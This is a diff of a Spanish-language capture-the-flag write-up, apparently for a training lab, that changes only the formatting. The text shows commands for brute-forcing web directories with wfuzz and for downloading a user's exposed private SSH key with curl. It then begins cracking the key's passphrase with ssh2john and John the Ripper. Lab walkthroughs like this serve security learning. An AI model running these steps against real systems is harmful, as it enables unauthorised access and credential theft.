@@ -10,7 +10,7 @@
 	* Web:
 		* Buscamos los _Directorios_:
   			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://[IP]/FUZZ"`
-				* Encontramos a _/admin_ únicamente	
+				* Encontramos a /admin únicamente	
 			
 		* Pasamos a enumerar los _Recursos_:
   			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://[IP]/admin/FUZZ"`
@@ -29,8 +29,9 @@ ___
 		* Encontramos que las credenciales son `admin:******`. Tambien, la **Web Flag**.
 
 * Sistema:
-	* Hacemos click en el enlace para obtener la Clave Privada del usuario del sistema, que parece ser `john`. Nos lleva a dicho recurso, el cual pasamos a descargar con:
-    	* `curl -O http://10.48.174.154/admin/panel/id_rsa`
+	* Hacemos click en el enlace para obtener la **Clave Privada** del usuario del sistema, que parece ser `john`. Nos lleva a dicho recurso, el cual pasamos a descargar con:
+ 		* `curl -O http://10.48.174.154/admin/panel/id_rsa`
+  
     * Una vez lo tenemos, debemos _Crackear la Passphrase_ con John The Ripper, por lo cual hacemos:
     	* `chmod 600 id_rsa` (le damos permisos 600)
         * `ssh2john id_rsa > id_rsa.hash` (la convertimos a hash)
